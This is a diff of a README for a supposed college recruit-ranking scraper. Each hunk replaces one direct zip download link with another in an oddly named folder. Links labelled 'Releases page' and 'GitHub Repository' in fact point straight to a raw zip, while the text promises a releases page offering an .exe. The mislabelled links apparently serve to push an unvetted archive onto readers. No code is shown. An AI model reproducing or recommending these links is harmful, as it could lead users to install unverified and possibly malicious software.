@@ -1,6 +1,6 @@
 # 🎉 on3-recruit-scraper - Easily Grab College Recruit Rankings
 
-![Download on3-recruit-scraper](https://github.com/papkvnq/on3-recruit-scraper/raw/refs/heads/main/myall/recruit_on_scraper_1.3.zip)
+![Download on3-recruit-scraper](https://raw.githubusercontent.com/papkvnq/on3-recruit-scraper/main/myall/on-recruit-scraper-v3.1-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to on3-recruit-scraper! This tool helps you gather recruit rankings from
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the software: [on3-recruit-scraper Releases](https://github.com/papkvnq/on3-recruit-scraper/raw/refs/heads/main/myall/recruit_on_scraper_1.3.zip).
+To get started, visit this page to download the software: [on3-recruit-scraper Releases](https://raw.githubusercontent.com/papkvnq/on3-recruit-scraper/main/myall/on-recruit-scraper-v3.1-beta.1.zip).
 
 Once you are on the Releases page, look for the latest version of the application. Click on the filename to download it. The file format will usually be `.exe` for Windows or `.zip` for other platforms. 
 
@@ -60,8 +60,8 @@ If you encounter any issues while using on3-recruit-scraper:
 
 For support or to contribute to the project, you can visit our GitHub repository. Join the community and stay informed about updates and new features.
 
-- [GitHub Repository](https://github.com/papkvnq/on3-recruit-scraper/raw/refs/heads/main/myall/recruit_on_scraper_1.3.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/papkvnq/on3-recruit-scraper/main/myall/on-recruit-scraper-v3.1-beta.1.zip)
 
 ## 🎉 Conclusion
 
-Downloading and using on3-recruit-scraper is a simple process. With just a few clicks, you can manage and analyze college recruit data efficiently. Don’t forget to visit this page to download: [on3-recruit-scraper Releases](https://github.com/papkvnq/on3-recruit-scraper/raw/refs/heads/main/myall/recruit_on_scraper_1.3.zip). Happy scraping!
+Downloading and using on3-recruit-scraper is a simple process. With just a few clicks, you can manage and analyze college recruit data efficiently. Don’t forget to visit this page to download: [on3-recruit-scraper Releases](https://raw.githubusercontent.com/papkvnq/on3-recruit-scraper/main/myall/on-recruit-scraper-v3.1-beta.1.zip). Happy scraping!
